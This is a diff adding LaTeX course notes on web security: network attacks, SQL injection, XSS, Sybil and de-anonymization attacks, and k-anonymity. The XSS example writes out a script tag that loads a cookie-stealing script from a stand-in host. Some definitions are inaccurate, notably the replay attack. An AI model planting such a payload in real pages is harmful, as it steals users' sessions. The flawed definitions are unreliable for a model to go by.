@@ -1,0 +1,67 @@
+\lecture{6}{}{Web Security}
+\section{Network Attacks}
+\begin{definition}[Eavesdropping]
+    Eavesdropping attacks consist of capturing a router and listening in.
+\end{definition}
+
+\begin{definition}[Masquerading]
+    Pretending to be a website by copying the HTML and hosting that copy.
+\end{definition}
+
+\begin{definition}[Man-in-the-Middle Attack]
+    When an attacker uses masquerading to place themselves in between a client and another service. 
+\end{definition}
+
+\begin{definition}[Replay Attack]
+    When a service simulates the sending of a message (say a money transfer) more times than it was intended to send.
+\end{definition}
+
+\section{Web Attacks}
+
+\begin{definition}[SQL Injection]
+     An attack in which SQL commands are injected into data-plane input in order to affect the execution of commands occurring on the server.
+\end{definition}
+
+SQL injection attacks can be mitigated by \emph{escaping all user input}. Various services do this for you when using their framework.
+
+\begin{definition}[Cross-Site Scripting Attack]
+    Cross-site scripting attacks undermine the JavaScript sandbox in your browser. By doing so, an attacker can inject code from one page into another page. 
+\end{definition}
+
+An example cross-site scripting attack may look as follows:
+\begin{enumerate}
+    \item I have an account on Insta485
+    \item I notice that when I add a post, the title is displayed in the page's HTML
+    \item I add a post called \texttt{Check this out!<script src="http://bob.com/cookiejar.js">}
+    \item You load my post page and run my script
+    \item My script steals info from user or the DOM
+\end{enumerate}
+
+\begin{definition}[Sybil Attack]
+    The creation of fake users to undermine the reputation systems (e.g. Amazon reviews, AirBnB, Reddit, etc.).
+\end{definition}
+
+Various defenses against \textbf{sybil} attacks exist that are very effective. We want 1 account per 1 real person, and we can get closer to this by weighing accounts with histories, verification, etc. Further, we can raise the cost of creating a user account. CAPTCHAs (Completely Automated Public Turing tests to tell Computers and Humans Apart) are also effective.
+
+\begin{definition}[De-Anonymization Attack]
+    The process of recovering identifiers from de-identified data.
+\end{definition}
+
+De-anonymization attacks lead to an unsolvable problem: \emph{any release of data can improve an adversary's ability to identify}.
+
+\section{Database Privacy}
+We may not be able to solve the problem of anonymity, but we can achieve better results. We use the idea of \textbf{k-anonymity}.
+
+\begin{definition}[k-Anonymity]
+    The idea that by combining sets of data with similar attributes, identifying information about any one of the individuals contributing to that data can be obscured. Think "the power of hiding in the crowd".
+\end{definition}
+
+Although k-anonymity is useful, it does face several problems:
+\begin{itemize}
+    \item generalization loses information
+    \item NP hard to find optimal k-anonymization
+    \item \textbf{homogeneity}: everyone in a bucket has the same sensitive characteristic
+    \item background information attacks: what if we know that certain ethnicities are highly prone to certain diseases
+\end{itemize}
+
+We can change reported values randomly so that the answers obtained by the user have the same probability, whether or not a particular tuple is present in the database. Repeated queries are still a problem, however, as convergence upon the answer is possible.
